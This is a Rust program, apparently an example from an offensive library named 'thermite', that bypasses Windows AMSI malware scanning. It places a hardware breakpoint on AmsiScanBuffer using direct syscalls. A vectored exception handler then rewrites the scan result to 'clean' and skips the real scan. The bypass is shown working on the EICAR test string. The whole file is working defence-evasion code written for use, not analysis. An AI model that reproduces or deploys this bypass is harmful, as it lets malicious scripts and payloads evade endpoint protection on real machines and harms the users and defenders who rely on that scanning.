#![allow(nonstandard_style)]


use std::ffi::CString;
use std::ptr::null_mut;

use winapi::ctypes::c_void;
use winapi::shared::minwindef::ULONG;
use winapi::shared::ntdef::HRESULT;
use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
use winapi::um::libloaderapi::LoadLibraryA;
use winapi::um::minwinbase::EXCEPTION_SINGLE_STEP;
use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, HANDLE, PEXCEPTION_POINTERS, PVOID};
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};

use thermite::{direct_syscall, info};
use thermite::breakpoints::{get_arguments, search_breakpoint};
use thermite::peb_walk::{get_function_address, get_module_handle};


pub type HAMSICONTEXT = *mut c_void;
pub type HAMSISESSION = *mut c_void;
pub type AMSI_RESULT = i32;
pub type LPCWSTR = *const u16;
pub type LPCVOID = *const c_void;
#[link(name="amsi")]
extern "system" {
	pub fn AmsiInitialize(appName: LPCWSTR, amsiContext: *mut HAMSICONTEXT) -> HRESULT;
	pub fn AmsiUninitialize(amsiContext: HAMSICONTEXT);
	pub fn AmsiOpenSession(amsiContext: HAMSICONTEXT, amsiSession: *mut HAMSISESSION) -> HRESULT;
	pub fn AmsiCloseSession(amsiContext: HAMSICONTEXT, amsiSession: HAMSISESSION);
	pub fn AmsiScanBuffer(
		amsiContext: HAMSICONTEXT,
		buffer: LPCVOID,
		length: ULONG,
		contentName: LPCWSTR,
		session: HAMSISESSION,
		result: *mut AMSI_RESULT
	) -> HRESULT;
}

fn setup() -> Result<PVOID, String> {
	let procaddr: *const u8;
	let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
	thread_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	unsafe {
		let module_name = CString::new("amsi.dll").unwrap();
		let modhandle = get_module_handle("amsi.dll").unwrap_or(LoadLibraryA(module_name.as_ptr()));
		procaddr = get_function_address("AmsiScanBuffer", modhandle as _).unwrap();
		if procaddr.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
	}

	let veh = unsafe { AddVectoredExceptionHandler(1, Some(vectored_handler)) };
	if veh.is_null() { return Err("Failed to add exception handler".to_string()) };

	let status = direct_syscall!("NtGetContextThread", -2i32 as HANDLE, &mut thread_ctx);
	if status != 0 { return Err(format!("Failed to get context thread: {status:x}")) };

	// Set the breakpoint address to DR0, then enable DR0 by setting the first bit of DR7 to 1
	thread_ctx.Dr0 = procaddr as u64;
	thread_ctx.Dr7 |= 1;

	let status = direct_syscall!("NtSetContextThread", -2i32 as HANDLE, &mut thread_ctx);
	if status != 0 { return Err(format!("Failed to set context thread: {status:x}")) };
	Ok(veh)
}

fn test_amsi() -> Result<(), String> {
	let eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	let name_utf16: Vec<u16> = "TestSession123".encode_utf16().chain(std::iter::once(0)).collect();

	let mut amsi_ctx = null_mut();
	let mut amsi_session = null_mut();
	let mut res = unsafe { AmsiInitialize(name_utf16.as_ptr(), &mut amsi_ctx) };
	if res != 0 { return Err("Failed to initialize AMSI".to_string()); }
	unsafe { AmsiOpenSession(amsi_ctx, &mut amsi_session) };

	info!("Scanning the sample...");
	unsafe { AmsiScanBuffer(
		amsi_ctx,
		eicar_string.as_ptr() as *const c_void,
		eicar_string.len() as ULONG,
		name_utf16.as_ptr(),
		amsi_session,
		&mut res) };
	println!("\t> Scan Result: {res:#x}");
	match res { 0 => println!("\t> The sample is clean"),
				1 => println!("\t> The sample may be clean"),
  0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
		 0x8000.. => println!("\t> The sample is definitely malware"),
				_ => println!("\t> ???")}

	match setup() { Ok(_) => { info!("Successfully set up breakpoint") }, Err(e) => return Err(e) };

	info!("Let's scan the same sample with the bypass active");
	unsafe { AmsiScanBuffer(
		amsi_ctx,
		eicar_string.as_ptr() as *const c_void,
		eicar_string.len() as ULONG,
		name_utf16.as_ptr(),
		amsi_session,
		&mut res) };
	println!("\t> Scan Result: {res:#x}");
	match res { 0 => println!("\t> The sample is clean"),
				1 => println!("\t> The sample may be clean"),
  0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
		 0x8000.. => println!("\t> The sample is definitely malware"),
				_ => println!("\t> ???")}
	if res == 0 {
		println!("[^o^]/ Hell yeah !");
	}

	unsafe {
		AmsiCloseSession(amsi_ctx, amsi_session);
		AmsiUninitialize(amsi_ctx);
	}

	Ok(())
}

pub unsafe extern "system" fn vectored_handler(exception_info: PEXCEPTION_POINTERS) -> i32 {
	unsafe {
		let rec = &(*(*exception_info).ExceptionRecord);
		let ctx = &mut (*(*exception_info).ContextRecord);
		if rec.ExceptionCode == EXCEPTION_SINGLE_STEP && search_breakpoint(rec.ExceptionAddress, ctx).is_some() {
			info!("Hardware Breakpoint Hit ! Time for mischief !");
			callback(ctx);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		EXCEPTION_CONTINUE_SEARCH
	}
}

fn callback(ctx: &mut CONTEXT) {
	// The last argument should be a pointer to the result of the scan
	let result_ptr = get_arguments(ctx, 5) as *mut u32;
	let scan_res = unsafe { *result_ptr };
	println!("\t> AMSI really scanned: {scan_res:#x}");
	info!("But let's change it to 0 o/");
	unsafe { *result_ptr = 0; }

	// Set Instruction pointer to the last return value on the stack
	unsafe { ctx.Rip = *(ctx.Rsp as *const u64); }
	ctx.Rsp += std::mem::size_of::<*const u64>() as u64;

	ctx.Rax = 0;         // Set 0 as return value
	ctx.EFlags |= 1<<16; // Set Resume Flag to 1
}


fn main() {
	test_amsi().unwrap();
}